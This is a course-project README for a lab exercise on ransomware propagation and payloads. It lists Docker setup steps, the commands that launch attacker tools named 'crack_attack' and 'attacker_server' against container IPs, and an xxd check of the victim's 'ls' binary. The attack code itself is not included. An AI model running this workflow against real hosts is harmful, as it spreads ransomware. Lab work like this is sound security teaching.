# CSC Project3 - Ransomware Propagation and Payload

### ----- env setup -----
```bash
docker network prune
sudo docker build -t csc2024-project3 -f csc2024-project3.Dockerfile .
sudo docker compose -f csc2024-project3-docker-compose.yml up -d
```

### ----- reload yml -----
```bash
sudo docker compose -f csc2024-project3-docker-compose.yml down
```

### ----- run attacker -----
```bash
docker exec -it attacker bash
cd ../home/csc2024/id
./crack_attack  172.18.0.3 172.18.0.2 7777
./attacker_server 7777
```

> Note:  
> I added `volumes: - ./source:/home/csc2024/id` into the yml file, so that the folder `id` in the docker is synchronize with our environment.

### ----- run victim -----
```bash
docker exec -it victim bash
xxd ls | tail -n 1
```